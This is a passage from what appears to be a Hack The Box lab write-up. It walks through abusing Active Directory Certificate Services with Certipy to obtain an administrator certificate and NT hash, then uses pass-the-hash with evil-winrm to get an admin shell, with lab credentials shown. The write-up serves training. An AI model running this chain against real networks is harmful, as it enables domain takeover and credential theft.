[*] Saved private key to 19.key  
[-] Failed to request certificate
```

Although the initial attempt fails, it still saves the private key. Next, using the Manage CA and Manage Certificates privileges, I’ll use the `ca` subcommand to issue the request:

```bash
certipy ca -ca manager-DC01-CA -issue-request 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*] Successfully issued certificate
```

Now, the issued certificate can be retrieved using the `req` command:

```bash
certipy req -ca manager-DC01-CA -target dc01.manager.htb -retrieve 13 -username raven@manager.htb -p 'R4v3nBe5tD3veloP3r!123'  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
[*] Retrieving certificate with ID 13  
[*] Successfully retrieved certificate  
[*] Got certificate with UPN 'administrator@manager.htb'  
[*] Certificate has no object SID  
[*] Loaded private key from '13.key'  
[*] Saved certificate and private key to 'administrator.pfx'
```

Here’s the updated version without the extra part:

```bash
certipy auth -pfx administrator.pfx -dc-ip manager.htb  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[-] Got error: nameserver manager.htb is not an IP address or valid https URL  
[-] Use -debug to print a stacktrace
```

```bash
certipy auth -pfx administrator.pfx -dc-ip 10.10.11.236  
Certipy v4.8.2 - by Oliver Lyak (ly4k)  
  
[*] Using principal: administrator@manager.htb  
[*] Trying to get TGT...  
[*] Got TGT  
[*] Saved credential cache to 'administrator.ccache'  
[*] Trying to retrieve NT hash for 'administrator'  
[*] Got hash for 'administrator@manager.htb': aad3b435b51404eeaad3b435b51404ee:ae5064c2f62317332c88629e025924ef
```

**Pass The Hash**

```bash
 evil-winrm -i manager.htb -u administrator -H ae5064c2f62317332c88629e025924ef  
  
Evil-WinRM shell v3.4  
  
Info: Establishing connection to remote endpoint  
  
*Evil-WinRM* PS C:\Users\Administrator\Documents>
```



Attention Hack The Box VPN: I encountered a lot of errors with the last machines, so you should perform all of this with pwned machine.

![](https://cdn-images-1.medium.com/max/800/0*ADfBJfvQBjSiPZXc)

#### 📌References and Suggested Reading

> 🔗 [https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-1-799f3d3b03cf](https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-1-799f3d3b03cf)

> 🔗 [https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-2-ac7f925d1547](https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-2-ac7f925d1547)

> 🔗 [https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-3-33efb00856ac](https://posts.specterops.io/adcs-attack-paths-in-bloodhound-part-3-33efb00856ac)

> 🔗 [https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-one/)

> 🔗 [https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-2/](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-2/)

> 🔗 [https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-3/)

> 🔗 [https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-4/](https://www.blackhillsinfosec.com/abusing-active-directory-certificate-services-part-4/)

By Mohamed Eletreby on September 25, 2024.

Canonical link

Exported from Medium on April 20, 2026.